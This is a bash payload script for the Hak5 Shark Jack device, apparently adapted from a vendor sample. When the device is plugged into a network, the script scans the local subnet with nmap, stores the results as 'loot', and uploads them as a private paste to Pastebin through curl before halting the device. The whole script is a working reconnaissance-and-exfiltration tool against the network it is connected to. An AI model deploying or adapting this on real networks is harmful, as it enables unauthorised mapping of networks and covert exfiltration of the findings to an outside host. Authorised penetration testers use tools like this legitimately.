#!/bin/bash
#
# Title:         Sample Nmap Payload with Pastebin exfiltration
# Author:        MonsieurMarc (Based on the orignial HAK5 sample payload)
# Version:       1.0
#
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder and then uploads it to pastebin as a private paste.
#This payload requires you to install curl via opkg
#
# Red ...........Setup
# Amber..........Scanning
# Green..........Finished
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.
#
#Please enter your Pastebin.com details below
#

NMAP_OPTIONS="-sP"
LOOT_DIR=/root/loot/nmap
SCAN_DIR=/etc/shark/nmap
API_KEY='Enter your Pastebin.com API Key here'
API_USER='Enter your Pastebin.com username here'
API_PASSWORD='Enter your Pastebin.com password here'


function finish() {
	LED CLEANUP
	# Kill Nmap
	wait $1
	kill $1 &> /dev/null

	# Sync filesystem
	echo $SCAN_M > $SCAN_FILE
	sync
	sleep 1
 
	#Login to Pastebin and get api key
        login

	#Upload the loot as a paste
	pastebin
	sleep 1

	LED FINISH
	sleep 1

	# Halt system
	halt
}

function setup() {
	LED SETUP
	# Create loot directory
	mkdir -p $LOOT_DIR &> /dev/null

	# Set NETMODE to DHCP_CLIENT for Shark Jack v1.1.0+
	NETMODE DHCP_CLIENT
	# Wait for an IP address to be obtained
	while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done

	# Create tmp scan directory
	mkdir -p $SCAN_DIR &> /dev/null

	# Create tmp scan file if it doesn't exist
	SCAN_FILE=$SCAN_DIR/scan-count
	if [ ! -f $SCAN_FILE ]; then
		touch $SCAN_FILE && echo 0 > $SCAN_FILE
	fi

	# Find IP address and subnet
	while [ -z "$SUBNET" ]; do
		sleep 1 && find_subnet
	done
}

function find_subnet() {
	SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
}

function run() {
	# Run setup
	setup

	SCAN_N=$(cat $SCAN_FILE)
	SCAN_M=$(( $SCAN_N + 1 ))

	LED ATTACK
	# Start scan
	nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$SCAN_M.txt &>/dev/null &
	tpid=$!
	finish $tpid
}

function pastebin () {	
	#Send the nmap scan file text to the pastebin via the api
     TEXT=$(<$LOOT_DIR/nmap-scan_$SCAN_M.txt)
     curl -d 'api_paste_code='"$TEXT"'' -d 'api_dev_key='"$API_KEY"'' -d 'api_user_key='"$LOGIN_KEY"'' -d 'api_option=paste' -d 'api_paste_private=2' 'https://pastebin.com/api/api_post.php'
}

function login(){
	#Login to pastebin and get a login key
     	LOGIN_KEY=$(echo | curl -d @- -d 'api_dev_key='"$API_KEY"'' -d 'api_user_name='"$API_USER"'' -d 'api_user_password='"$API_PASSWORD"'' 'https://pastebin.com/api/api_login.php')
}

# Run payload
run &
